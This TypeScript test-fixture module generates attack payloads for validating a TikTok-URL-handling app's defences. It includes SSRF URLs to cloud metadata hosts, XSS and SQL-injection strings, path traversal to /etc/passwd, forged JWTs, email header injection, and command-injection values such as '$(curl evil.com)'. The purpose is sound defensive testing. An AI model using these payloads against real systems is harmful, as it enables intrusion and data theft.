/**
 * Security attack-vector generators for matrix / mega security test suites.
 */

export type SecurityCase<T = string> = {
  id: string;
  payload: T;
  category: string;
  mustReject?: boolean;
  note?: string;
};

let seq = 0;
export function secId(prefix: string): string {
  seq += 1;
  return `${prefix}-${seq}`;
}

export function resetSecurityIds(): void {
  seq = 0;
}

const SSRF_HOSTS = [
  '127.0.0.1',
  'localhost',
  '0.0.0.0',
  '10.0.0.1',
  '10.255.255.255',
  '172.16.0.1',
  '172.31.255.255',
  '192.168.0.1',
  '192.168.255.255',
  '169.254.169.254',
  '[::1]',
  '::1',
  'metadata.google.internal',
  '169.254.169.254.nip.io',
];

const SSRF_PATHS = [
  '/',
  '/latest/meta-data/',
  '/admin',
  '/.env',
  '/api/v1/secrets',
  '/@user/video/1',
];

/** URLs that must never pass sanitizeTikTokUrl. */
export function generateSsrfAttackUrls(count: number): SecurityCase[] {
  const out: SecurityCase[] = [];
  for (let i = 0; i < count; i++) {
    const host = SSRF_HOSTS[i % SSRF_HOSTS.length];
    const path = SSRF_PATHS[i % SSRF_PATHS.length];
    const scheme = i % 3 === 0 ? 'http' : 'https';
    const variants = [
      `${scheme}://${host}${path}`,
      `${scheme}://${host}:8080${path}`,
      `${scheme}://user:pass@${host}${path}`,
      `${scheme}://${host}%2f${path.slice(1)}`,
      `${scheme}://${host}@${host}${path}`,
    ];
    const payload = variants[i % variants.length];
    out.push({
      id: secId('ssrf'),
      payload,
      category: 'ssrf',
      mustReject: true,
    });
  }
  return out;
}

/** Non-TikTok hosts that look related. */
export function generateTikTokSpoofUrls(count: number): SecurityCase[] {
  const hosts = [
    'tiktok.evil.com',
    'evil.tiktok.com',
    'tiktok.com.evil.com',
    'notiktok.com',
    'tiktok.co',
    'tiktokcom.com',
    'www.tiktok.com.attacker.com',
    'tiktok.com%2f.evil.com',
    'xn--tiktok-abc.com',
    'www.tiktok.com@evil.com',
  ];
  const out: SecurityCase[] = [];
  for (let i = 0; i < count; i++) {
    const host = hosts[i % hosts.length];
    out.push({
      id: secId('spoof'),
      payload: `https://${host}/@u/video/${7000000000000000000n + BigInt(i)}`,
      category: 'domain-spoof',
      mustReject: true,
    });
  }
  return out;
}

const XSS_BASE = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg/onload=alert(1)>',
  '<body onload=alert(1)>',
  '<iframe src="javascript:alert(1)">',
  '<math><mtext></mtext><mglyph><style><img src=x onerror=alert(1)></style>',
  'javascript:alert(1)',
  '"><script>alert(1)</script>',
  "'-alert(1)-'",
  '<details open ontoggle=alert(1)>',
  '<marquee onstart=alert(1)>',
  '<video><source onerror=alert(1)>',
  '<input onfocus=alert(1) autofocus>',
  '<select onfocus=alert(1) autofocus>',
  '<textarea onfocus=alert(1) autofocus>',
  '<keygen onfocus=alert(1) autofocus>',
  '<isindex onfocus=alert(1) autofocus>',
  '<object data="javascript:alert(1)">',
  '<embed src="javascript:alert(1)">',
  '<form><button formaction="javascript:alert(1)">',
];

export function generateXssPayloads(count: number): SecurityCase[] {
  const out: SecurityCase[] = [];
  for (let i = 0; i < count; i++) {
    const base = XSS_BASE[i % XSS_BASE.length];
    const payload = `${' '.repeat(i % 5)}${base}${'!'.repeat(i % 3)}`;
    out.push({ id: secId('xss'), payload, category: 'xss', mustReject: true });
  }
  return out;
}

const SQLI = [
  "' OR '1'='1",
  "'; DROP TABLE users; --",
  "1; SELECT * FROM users",
  "admin'--",
  "' UNION SELECT null,null,null--",
  "1' AND SLEEP(5)--",
  "' OR 1=1#",
  "') OR ('1'='1",
  '"; DELETE FROM save_items WHERE "1"="1',
  "1; UPDATE users SET password_hash='x'",
  "${7*7}",
  "{{7*7}}",
  "'; EXEC xp_cmdshell('dir'); --",
];

export function generateSqlInjectionStrings(count: number): SecurityCase[] {
  const out: SecurityCase[] = [];
  for (let i = 0; i < count; i++) {
    out.push({
      id: secId('sqli'),
      payload: SQLI[i % SQLI.length] + (i > SQLI.length ? ` /*${i}*/` : ''),
      category: 'sqli',
    });
  }
  return out;
}

const PROTO_POLLUTION = [
  { __proto__: { isAdmin: true } },
  { constructor: { prototype: { polluted: true } } },
  { ['__proto__']: { role: 'admin' } },
  JSON.parse('{"__proto__":{"polluted":true}}'),
  { 'constructor.prototype.polluted': true },
];

export function generatePrototypePollutionPayloads(count: number): SecurityCase<Record<string, unknown>>[] {
  const out: SecurityCase<Record<string, unknown>>[] = [];
  for (let i = 0; i < count; i++) {
    const base = PROTO_POLLUTION[i % PROTO_POLLUTION.length];
    const payload =
      typeof base === 'object' && base !== null
        ? { ...(base as Record<string, unknown>), title: `<b>${i}</b>` }
        : { title: String(base) };
    out.push({ id: secId('proto'), payload, category: 'prototype-pollution' });
  }
  return out;
}

const INTERNAL_SETTINGS_KEYS = [
  'passwordResetToken',
  'passwordResetExpiry',
  'password_hash',
  'refreshToken',
  'apiKey',
  'secret',
];

export function generateLeakySettingsObjects(count: number): SecurityCase<Record<string, unknown>>[] {
  const out: SecurityCase<Record<string, unknown>>[] = [];
  for (let i = 0; i < count; i++) {
    const settings: Record<string, unknown> = {
      theme: 'dark',
      enableVideoUpload: true,
    };
    for (let k = 0; k <= i % INTERNAL_SETTINGS_KEYS.length; k++) {
      settings[INTERNAL_SETTINGS_KEYS[k]] = `leak-value-${i}-${k}`;
    }
    out.push({ id: secId('leak'), payload: settings, category: 'settings-leak' });
  }
  return out;
}

const NON_TIKTOK_CDN = [
  'https://cdn.example.com/img.jpg',
  'https://evil.com/photo.png',
  'https://p16-sign-sg.evilcdn.com/obj/x.jpeg',
  'https://tiktokcdn.com.evil.net/x.jpg',
  'https://byteimg.com.attacker.com/x',
  'http://127.0.0.1/thumb.jpg',
  'https://www.tiktok.com/steal?redirect=evil',
];

const TIKTOK_CDN_OK = [
  'https://p16-sign-sg.tiktokcdn.com/obj/cover-123~tplv.jpeg',
  'https://p19-common-sign.tiktokcdn-us.com/obj/x.jpeg',
  'https://p16-sign-va.tiktokcdn-eu.com/obj/y.jpeg',
  'https://p16-sign.tiktokcdn.net/obj/z.jpeg',
  'https://p16-sign-sg.byteimg.com/obj/a.jpeg',
  'https://www.tiktok.com/obj/cover-abc.jpeg',
];

export function generateMaliciousImageUrls(count: number): SecurityCase[] {
  const out: SecurityCase[] = [];
  for (let i = 0; i < count; i++) {
    const pool = i % 5 === 0 ? TIKTOK_CDN_OK : NON_TIKTOK_CDN;
    const payload = pool[i % pool.length] + (i > 20 ? `?v=${i}` : '');
    out.push({
      id: secId('img'),
      payload,
      category: i % 5 === 0 ? 'cdn-allow' : 'cdn-block',
      mustReject: i % 5 !== 0,
    });
  }
  return out;
}

const UNICODE_TRICKS = [
  'tiktok\u200b.com',
  'tiktok\u202e.com',
  'ｗｗｗ.tiktok.com',
  'tiktok。com',
  'TIKTOK.COM',
  'tiktok.com\x00.evil.com',
  'user@еxample.com',
  'user+tag@example.com',
];

export function generateUnicodeTrickStrings(count: number): SecurityCase[] {
  const out: SecurityCase[] = [];
  for (let i = 0; i < count; i++) {
    out.push({
      id: secId('unicode'),
      payload: UNICODE_TRICKS[i % UNICODE_TRICKS.length] + String(i % 7),
      category: 'unicode',
    });
  }
  return out;
}

const PATH_TRAVERSAL = [
  '../../../etc/passwd',
  '..\\..\\windows\\system32',
  '%2e%2e%2f%2e%2e%2f',
  '....//....//etc/passwd',
  '/var/www/../../etc/passwd',
];

export function generatePathTraversalStrings(count: number): SecurityCase[] {
  const out: SecurityCase[] = [];
  for (let i = 0; i < count; i++) {
    out.push({
      id: secId('path'),
      payload: PATH_TRAVERSAL[i % PATH_TRAVERSAL.length],
      category: 'path-traversal',
    });
  }
  return out;
}

type JwtModule = typeof import('jsonwebtoken');

/** JWT attack shapes (unsigned / wrong alg / tampered). */
export function generateJwtAttackCases(
  jwt: JwtModule,
  secret: string,
): Array<{
  id: string;
  token: string;
  category: string;
  shouldReject: boolean;
}> {
  const cases: Array<{ id: string; token: string; category: string; shouldReject: boolean }> = [];

  cases.push({
    id: secId('jwt'),
    token: 'not.a.jwt',
    category: 'malformed',
    shouldReject: true,
  });

  cases.push({
    id: secId('jwt'),
    token: '',
    category: 'empty',
    shouldReject: true,
  });

  cases.push({
    id: secId('jwt'),
    token: jwt.sign({ userId: 'x' }, secret, { expiresIn: '-1h' }),
    category: 'expired',
    shouldReject: true,
  });

  cases.push({
    id: secId('jwt'),
    token: jwt.sign({ userId: 'x' }, 'wrong-secret', { expiresIn: '1h' }),
    category: 'wrong-secret',
    shouldReject: true,
  });

  cases.push({
    id: secId('jwt'),
    token: jwt.sign({ role: 'admin' }, secret, { expiresIn: '1h' }),
    category: 'missing-userId',
    shouldReject: true,
  });

  cases.push({
    id: secId('jwt'),
    token: jwt.sign({ userId: 'valid-user' }, secret, { expiresIn: '1h' }),
    category: 'valid',
    shouldReject: false,
  });

  // none algorithm style (manual header)
  const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
  const payload = Buffer.from(JSON.stringify({ userId: 'admin' })).toString('base64url');
  cases.push({
    id: secId('jwt'),
    token: `${header}.${payload}.`,
    category: 'alg-none',
    shouldReject: true,
  });

  for (let i = 0; i < 20; i++) {
    const tampered = jwt.sign({ userId: `user-${i}` }, secret, { expiresIn: '1h' });
    const parts = tampered.split('.');
    parts[1] = parts[1].slice(0, -2) + 'XX';
    cases.push({
      id: secId('jwt'),
      token: parts.join('.'),
      category: 'tampered-payload',
      shouldReject: true,
    });
  }

  return cases;
}

export function generateNullBytePayloads(count: number): SecurityCase[] {
  const out: SecurityCase[] = [];
  for (let i = 0; i < count; i++) {
    out.push({
      id: secId('null'),
      payload: `Japan\0${'A'.repeat(i % 10)}Drop`,
      category: 'null-byte',
    });
  }
  return out;
}

export function generateCommandInjectionStrings(count: number): SecurityCase[] {
  const cmds = ['; ls -la', '| cat /etc/passwd', '&& whoami', '`id`', '$(curl evil.com)'];
  return Array.from({ length: count }, (_, i) => ({
    id: secId('cmd'),
    payload: `folder${cmds[i % cmds.length]}`,
    category: 'command-injection',
  }));
}

export function generateEmailAttackStrings(count: number): SecurityCase[] {
  const attacks = [
    'test@example.com\r\nBcc: attacker@evil.com',
    'test@example.com\nCc: evil@evil.com',
    'a@b.com<script>',
    '"><test@example.com',
    'test@example.com%00@evil.com',
    '....@....',
    '@example.com',
    'test@',
    '',
    '   ',
  ];
  return Array.from({ length: count }, (_, i) => ({
    id: secId('email'),
    payload: attacks[i % attacks.length],
    category: 'email-attack',
    mustReject: true,
  }));
}

export function generateValidTikTokUrls(count: number): SecurityCase[] {
  const hosts = ['www.tiktok.com', 'tiktok.com', 'm.tiktok.com', 'vm.tiktok.com'];
  return Array.from({ length: count }, (_, i) => {
    const host = hosts[i % hosts.length];
    const path =
      host === 'vm.tiktok.com'
        ? `/ZM${(i + 1).toString(36).padStart(8, '0')}/`
        : `/@creator${i % 30}/video/${7000000000000000000n + BigInt(i)}`;
    return {
      id: secId('valid-tt'),
      payload: `https://${host}${path}`,
      category: 'valid-tiktok',
      mustReject: false,
    };
  });
}

/** Flat catalog for reporting total case count. */
export function buildSecurityCatalog() {
  resetSecurityIds();
  return {
    ssrf: generateSsrfAttackUrls(500),
    spoof: generateTikTokSpoofUrls(200),
    xss: generateXssPayloads(600),
    sqli: generateSqlInjectionStrings(200),
    proto: generatePrototypePollutionPayloads(150),
    leaks: generateLeakySettingsObjects(150),
    images: generateMaliciousImageUrls(400),
    unicode: generateUnicodeTrickStrings(200),
    paths: generatePathTraversalStrings(100),
    nulls: generateNullBytePayloads(100),
    commands: generateCommandInjectionStrings(100),
    emails: generateEmailAttackStrings(200),
    validTikTok: generateValidTikTokUrls(300),
  };
}
